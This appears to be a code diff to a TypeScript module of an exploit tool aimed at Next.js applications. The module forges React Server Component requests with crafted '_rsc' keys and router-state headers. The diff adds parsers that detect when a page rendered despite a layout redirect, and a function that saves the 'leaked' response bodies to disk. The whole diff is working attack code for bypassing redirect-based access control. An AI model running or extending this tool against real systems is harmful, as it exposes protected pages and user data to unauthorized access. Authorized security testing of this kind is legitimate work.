@@ -1,4 +1,6 @@
 import { createHash } from "node:crypto";
+import fs from "node:fs";
+import path from "node:path";
 import rawRequest from "../../../exploit/utility/rawRequest.js";
 
 /** Marker Next.js embeds in a Flight payload when a layout/page calls redirect(). */
@@ -138,6 +140,9 @@ export type RscKeyMode = "legacy" | "strong";
 export interface ForgeAttemptResult {
     success: boolean;
     body: string;
+    /** URL (with its `_rsc` key) and headers of the request that produced `body`. */
+    requestUrl?: string;
+    requestHeaders?: Record<string, string>;
 }
 
 /** Renders an ancestor-segment list back to its literal URL path, for the `Next-Url` header. */
@@ -164,20 +169,19 @@ const attemptForge = async (
     const forgedUrl = new URL(candidateUrl);
     forgedUrl.searchParams.set("_rsc", rscKey);
 
-    const forged = await rawRequest(forgedUrl.toString(), {
-        timeout,
-        headers: {
-            RSC: "1",
-            "Next-Router-State-Tree": stateTree,
-            "Next-Url": nextUrl,
-        },
-    });
+    const requestHeaders = {
+        RSC: "1",
+        "Next-Router-State-Tree": stateTree,
+        "Next-Url": nextUrl,
+    };
+    const requestUrl = forgedUrl.toString();
+    const forged = await rawRequest(requestUrl, { timeout, headers: requestHeaders });
     if (!forged) return { success: false, body: "" };
 
     const contentType = forged.headers["content-type"] ?? "";
     const success =
         forged.status === 200 && contentType.includes("text/x-component") && !containsNextRedirectMarker(forged.body);
-    return { success, body: forged.body };
+    return { success, body: forged.body, requestUrl, requestHeaders };
 };
 
 /**
@@ -223,4 +227,109 @@ export const attemptForgeWithSchemaFallback = async (
         if (last.success) return last;
     }
     return last;
+};
+
+/**
+ * The raw Flight text of an HTML response: every `self.__next_f.push([1,"…"])` string literal,
+ * JSON-decoded and joined in order. `""` when the page has no inline Flight data.
+ */
+export const decodeHtmlFlight = (html: string): string => {
+    const parts: string[] = [];
+    for (const m of html.matchAll(/self\.__next_f\.push\(\[1,("(?:[^"\\]|\\.)*")\]\)/g)) {
+        try {
+            parts.push(JSON.parse(m[1]));
+        } catch {
+            // truncated or malformed chunk
+        }
+    }
+    return parts.join("");
+};
+
+/** Payload of Flight row `id` (`<id>:<payload>`), or `undefined` when the row isn't in `flight`. */
+const flightRow = (flight: string, id: string): string | undefined => {
+    const head = `${id}:`;
+    if (flight.startsWith(head)) return flight.slice(head.length);
+    // Rows normally start a line; a resumed PPR stream can also start one after a `,`.
+    for (const sep of ["\n", ","]) {
+        const i = flight.indexOf(sep + head);
+        if (i >= 0) return flight.slice(i + sep.length + head.length);
+    }
+    return undefined;
+};
+
+/** Max `$L<id>` hops `isRenderedValue` follows: guards against reference cycles. */
+const MAX_REF_DEPTH = 5;
+
+/**
+ * True when the Flight value at the start of `text` is rendered page output: an element, a
+ * non-empty string or text row, or a lazy reference (`"$L9"`) that resolves to one. An array is
+ * judged by its first item (the page slot; later items are metadata outlets). `null` and an error
+ * row (`9:E{"digest":"NEXT_REDIRECT…"}`, what a page that itself calls `redirect()` renders) are not.
+ */
+const isRenderedValue = (text: string, flight: string, depth = 0): boolean => {
+    const t = text.trimStart();
+    if (t.startsWith('["$",')) return true;
+    if (t.startsWith("[")) return isRenderedValue(t.slice(1), flight, depth);
+    const ref = t.match(/^"\$[L@]?([0-9a-f]+)"/);
+    if (ref) {
+        if (depth >= MAX_REF_DEPTH) return false;
+        const row = flightRow(flight, ref[1]);
+        if (row === undefined || row.startsWith("E")) return false;
+        if (row.startsWith("T")) return true;
+        return isRenderedValue(row, flight, depth + 1);
+    }
+    // A plain string child is text content; `"$undefined"`, `"$Sreact…"` and the like are not.
+    return /^"[^"$]/.test(t);
+};
+
+/**
+ * True when a Flight payload carries a rendered `__PAGE__` segment: the page component ran and
+ * its output was serialized. Next.js 16.4+ writes the segment as `{"s":"__PAGE__",…,"d":{"r":
+ * [element]}}`, older builds as `["__PAGE__",{},[element]]`; both are read as "the first
+ * `children` after the `__PAGE__` marker". With a `NEXT_REDIRECT` in the same payload, this is
+ * a layout redirected but the page under it rendered anyway.
+ */
+export const containsRenderedPageSegment = (flight: string): boolean => {
+    for (const m of flight.matchAll(/"(?:s":")?__PAGE__/g)) {
+        const window = flight.slice(m.index!, m.index! + 400);
+        const c = window.indexOf('"children":');
+        if (c >= 0 && isRenderedValue(window.slice(c + '"children":'.length), flight)) return true;
+    }
+    return false;
+};
+
+/** One RSF hit's saved response body (see `saveRsfLeak`). */
+export interface RsfLeak {
+    method: string;
+    url: string;
+    /** Saved body, relative to the host output directory. */
+    file: string;
+    /** Extra request headers that produced the response (e.g. the forged `Next-Router-State-Tree`). */
+    requestHeaders?: Record<string, string>;
+    chunks: string[];
+}
+
+/** Directory (under the host output dir) RSF leak bodies are written to. */
+export const RSF_LEAKS_DIR = "___rsf_revealed";
+
+/**
+ * Writes a leaked response body to `<hostDir>/___rsf_revealed/<method>/<path>-<hash>.<ext>` and returns
+ * its index entry. The hash (of the full URL and request headers) keeps `?a=1` and `?a=2`, or two
+ * `Next-Url` values for one URL, from overwriting each other.
+ */
+export const saveRsfLeak = (
+    hostDir: string,
+    leak: { method: string; url: string; body: string; ext: "html" | "rsc"; requestHeaders?: Record<string, string> },
+    chunks: string[]
+): RsfLeak => {
+    const u = new URL(leak.url);
+    const stem = (u.pathname.replace(/^\/+|\/+$/g, "") || "index").replace(/[^A-Za-z0-9._-]/g, "_").slice(0, 120);
+    const hash = createHash("sha256")
+        .update(leak.url + JSON.stringify(leak.requestHeaders ?? {}))
+        .digest("hex")
+        .slice(0, 8);
+    const file = path.join(RSF_LEAKS_DIR, leak.method, `${stem}-${hash}.${leak.ext}`);
+    fs.mkdirSync(path.join(hostDir, RSF_LEAKS_DIR, leak.method), { recursive: true });
+    fs.writeFileSync(path.join(hostDir, file), leak.body);
+    return { method: leak.method, url: leak.url, file, requestHeaders: leak.requestHeaders, chunks };
 };
